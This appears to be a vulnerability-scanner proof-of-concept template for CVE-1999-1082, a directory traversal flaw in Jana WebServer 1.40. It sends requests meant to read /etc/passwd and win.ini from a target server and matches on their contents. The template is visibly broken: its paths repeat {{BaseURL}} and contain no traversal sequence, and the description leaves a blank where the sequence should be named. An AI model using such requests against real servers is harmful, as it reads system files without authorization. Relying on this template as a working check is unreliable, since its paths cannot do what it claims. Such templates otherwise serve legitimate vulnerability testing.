[info]
author = "AVE"
description = "检测 Jana WebServer 1.40 目录遍历漏洞，通过发送特制的  路径遍历序列尝试读取服务器上的任意文件"
id = "POC-AVE-1999-0928"
name = "CVE-1999-1082 PoC"
severity = "medium"
tags = ["cve-1999-1082"]
vuln_id = [
    "CVE-1999-1082",
    "AVE-1999-0928",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/{{BaseURL}}/etc/passwd"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "root:",
    "bin:",
    "nobody:",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/{{BaseURL}}/windows/win.ini"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "[fonts]",
    "[extensions]",
    "[mail]",
]
